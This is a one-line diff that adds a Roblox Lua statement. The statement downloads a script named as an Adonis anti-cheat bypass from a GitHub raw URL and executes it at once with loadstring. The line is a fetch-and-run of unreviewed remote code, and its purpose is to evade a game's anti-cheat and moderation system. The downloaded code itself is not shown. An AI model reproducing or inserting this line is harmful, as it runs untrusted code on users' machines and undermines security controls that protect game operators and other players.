@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMinisterq/Misc-Script/main/adonis%20ac%20bypass.lua"))()
